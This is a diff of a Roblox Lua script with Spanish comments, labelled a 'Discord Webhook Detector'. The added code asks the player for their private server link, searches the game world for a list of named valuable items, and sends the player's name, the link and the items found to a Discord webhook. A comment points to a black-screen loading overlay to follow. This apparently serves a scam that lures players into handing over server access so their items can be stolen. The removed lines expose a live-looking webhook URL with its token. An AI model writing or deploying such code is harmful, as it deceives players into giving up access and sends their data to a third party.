@@ -1,38 +1,3 @@
--- 📘 MOREIRA METHOD - Discord Webhook Detector
--- Corrige errores y detecta objetos de la base del jugador
-
-local HttpService = game:GetService("HttpService")
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-local Workspace = game:GetService("Workspace")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-
--- 🔗 Webhook de Discord (coloca tu URL completa)
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1405766174419189842/b8qzM3d6u8a_OFGx5zIUsrSnp7TUkpCUCV4Y6tU_ZkSTMsHzf9XwEoWJzm9AqWbV3o6F"  
-
--- Evento remoto para comunicar cliente-servidor
-local SendDiscordWebhook = ReplicatedStorage:WaitForChild("SendDiscordWebhook")
-
--- Función que envía mensaje al webhook
-local function sendToDiscord(content)
-    local data = {
-        ["content"] = content
-    }
-    local jsonData = HttpService:JSONEncode(data)
-    local success, err = pcall(function()
-        HttpService:PostAsync(WEBHOOK_URL, jsonData, Enum.HttpContentType.ApplicationJson)
-    end)
-    if not success then
-        warn("Error enviando al webhook:", err)
-    end
-end
-
--- Conexión del evento remoto en servidor
-SendDiscordWebhook.OnServerEvent:Connect(function(player, message)
-    local content = player.Name .. " triggered: " .. message
-    sendToDiscord(content)
-end)
-
 -- Lista de nombres de objetos a monitorear
 local objectNames = {
     "la grande combinasion", "Ketchuru and Musturu", "Ketupat Kepat", "Burguro and Fryuro", "La Supreme Combinasion",
@@ -43,38 +8,57 @@ local objectNames = {
     "Spooky and Pumpky", "Chillin Chili", "Tictac Sahur", "La Extinct Grande", "Nuclearo Dinossauro"
 }
 
--- Función para conectar Touched a un objeto
-local function connectTouch(obj, displayName)
-    if obj:IsA("BasePart") then
-        obj.Touched:Connect(function(hit)
-            local humanoid = hit.Parent:FindFirstChild("Humanoid")
-            if humanoid and humanoid.Parent == LocalPlayer.Character then
-                -- Enviar mensaje al servidor
-                SendDiscordWebhook:FireServer(displayName)
-            end
-        end)
-    elseif obj:IsA("Model") then
-        for _, child in ipairs(obj:GetDescendants()) do
-            if child:IsA("BasePart") then
-                connectTouch(child, displayName)
-            end
-        end
-    end
-end
-
--- Conectar todos los objetos que ya existen
-for _, name in ipairs(objectNames) do
-    local obj = Workspace:FindFirstChild(name)
-    if obj then
-        connectTouch(obj, name)
-    end
-end
-
--- Conectar objetos que aparezcan después del inicio
-Workspace.ChildAdded:Connect(function(child)
+-- Función que busca los objetos en Workspace
+local function findObjects()
+    local found = {}
     for _, name in ipairs(objectNames) do
-        if child.Name == name then
-            connectTouch(child, name)
+        local obj = Workspace:FindFirstChild(name, true) -- true = busca en descendants
+        if obj then
+            table.insert(found, name)
         end
     end
+    return found
+end
+
+-- Función para enviar al webhook
+local HttpService = game:GetService("HttpService")
+local WEBHOOK_URL = "TU_WEBHOOK_AQUI"
+
+local function sendToDiscord(content)
+    local data = {["content"] = content}
+    local jsonData = HttpService:JSONEncode(data)
+    local success, err = pcall(function()
+        HttpService:PostAsync(WEBHOOK_URL, jsonData, Enum.HttpContentType.ApplicationJson)
+    end)
+    if not success then
+        warn("Error enviando al webhook:", err)
+    end
+end
+
+-- 🔹 Agregar al sendButton
+sendButton.MouseButton1Click:Connect(function()
+    local link = textBox.Text
+    if link == "" then
+        label.TextColor3 = Color3.fromRGB(255, 100, 100)
+        label.Text = "⚠️ Please enter your private server link!"
+        return
+    end
+
+    print("🔗 Link entered:", link)
+    inputFrame:Destroy() -- Quita el input frame
+
+    -- Buscar objetos del jugador
+    local objectsFound = findObjects()
+    local message
+    if #objectsFound == 0 then
+        message = LocalPlayer.Name .. " is in server: " .. link .. "\nNo monitored objects were found in the base."
+    else
+        message = LocalPlayer.Name .. " is in server: " .. link .. "\nObjects found: " .. table.concat(objectsFound, ", ")
+    end
+
+    -- Enviar mensaje al webhook
+    sendToDiscord(message)
+
+    -- Aquí continúa tu lógica de pantalla negra y barra de carga...
 end)
+
